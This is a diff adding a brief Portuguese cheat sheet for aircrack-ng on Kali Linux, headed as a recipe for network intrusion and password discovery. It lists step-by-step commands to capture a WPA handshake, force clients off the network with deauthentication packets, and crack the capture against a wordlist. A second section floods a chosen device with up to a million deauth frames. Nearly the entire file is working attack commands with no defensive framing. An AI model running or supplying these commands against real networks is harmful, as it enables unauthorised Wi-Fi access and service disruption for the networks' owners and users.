@@ -1,0 +1,38 @@
+AIRCRACK-NG 
+
+lembrando que o aincrack-ng só funciona no kali por boot no pendrive ou o kali instalado direto no SSD. não funciona no kali do virtual-box
+
+INVASÃO DE REDE DESCOBRINDO SENHA
+
+
+
+Sudo airmon-ng start wlan0
+
+Sudo airodump-ng wlan0mon
+
+Sudo airodump-ng --bssid (bssid-rede) -c (ch) -w captura wlan0mon
+
+EM OUTRO TERMINAL:
+
+sudo aireplay-ng --deauth 10 -a (bssid-rede) wlan0mon
+
+^C no primeiro terminal:
+
+Sudo aircrack-ng captura-01.cap -w wordlist.txt
+
+Sudo airmon-ng stop wlan0mon
+
+
+
+===========================================================
+
+
+ATAQUE DE DESAUTENTICAÇÃO
+
+Nmap -sn meu-ip/24 = mostra o IP dos dispositivos da rede e deus Mac
+
+sudo airodump-ng --bssid [BSSID] -c [canal] wlan0mon = mostra MACs da rede
+
+sudo aireplay-ng --deauth 1000000 -a [BSSID da rede] -c [MAC do seu celular] wlan0mon
+					OU
+sudo aireplay-ng -0 1000 -a [BSSID] -c [MAC DISPOSITIVO] wlp3s0mon
